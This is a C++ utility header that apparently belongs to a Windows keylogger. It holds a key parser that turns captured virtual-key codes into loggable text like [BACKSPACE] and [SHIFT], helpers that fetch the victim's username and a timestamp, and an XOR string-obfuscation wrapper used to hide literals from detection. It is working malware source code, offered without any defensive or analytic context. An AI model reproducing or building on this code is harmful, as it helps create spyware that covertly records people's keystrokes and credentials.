#pragma once
#include "c_includes.hpp"
#include "c_xor.hpp"

namespace c_utils {

	inline std::string random_string(size_t length) { //some stackoverflow function to generate random strings
		auto randchar = []() -> char {
			const char charset[] =
				"0123456789"
				"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
				"abcdefghijklmnopqrstuvwxyz";
			const size_t max_index = (sizeof(charset) - 1);
			return charset[rand() % max_index];
		};

		std::string str(length, 0);
		std::generate_n(str.begin(), length, randchar);

		return str;
	}

	inline std::string key_output(int key) { //my key parser
		char name[CHAR_MAX];
		int scan_code = MapVirtualKeyA(key, MAPVK_VK_TO_VSC);

		switch (key) {

		case VK_BACK:
			return " [BACKSPACE] ";

		case VK_TAB:
			return "\t";

		case VK_CLEAR:
			return " [CLEAR] ";

		case VK_RETURN:
			return "\n";

		case VK_SHIFT:
			return " [SHIFT] ";

		case VK_CONTROL:
			return " [CONTROL] ";

		case VK_MENU:
			return " [ALT] ";

		case VK_PAUSE:
			return " [PAUSE] ";

		case VK_CAPITAL:
			return " [CAPSLOCK] ";

		case VK_ESCAPE:
			return " [ESC] ";

		case VK_SPACE:
			return " ";

		case VK_END:
			return " [END] ";

		case VK_HOME:
			return " [HOME] ";

		case VK_SELECT:
			return " [SELECT] ";

		case VK_SNAPSHOT:
			return " [PRTSC] ";

		case VK_INSERT:
			return " [INSERT] ";

		case VK_DELETE:
			return " [DELETE] ";

		default:
			GetKeyNameTextA(scan_code << 16, name, CHAR_MAX);
			return name;
		}
	}

	inline std::string pc_username() {
		char username_buffer[256];
		DWORD buf_len = 256;

		GetUserNameA(username_buffer, &buf_len);

		return username_buffer;
	}

	inline std::string time_now() {
		std::tm tmn;
		char time_buffer[10];
		std::time_t tmt = std::time(0);

		localtime_s(&tmn, &tmt);
		std::strftime(time_buffer, 10, c_xor("%H:%M:%S"), &tmn);

		return time_buffer;
	}

}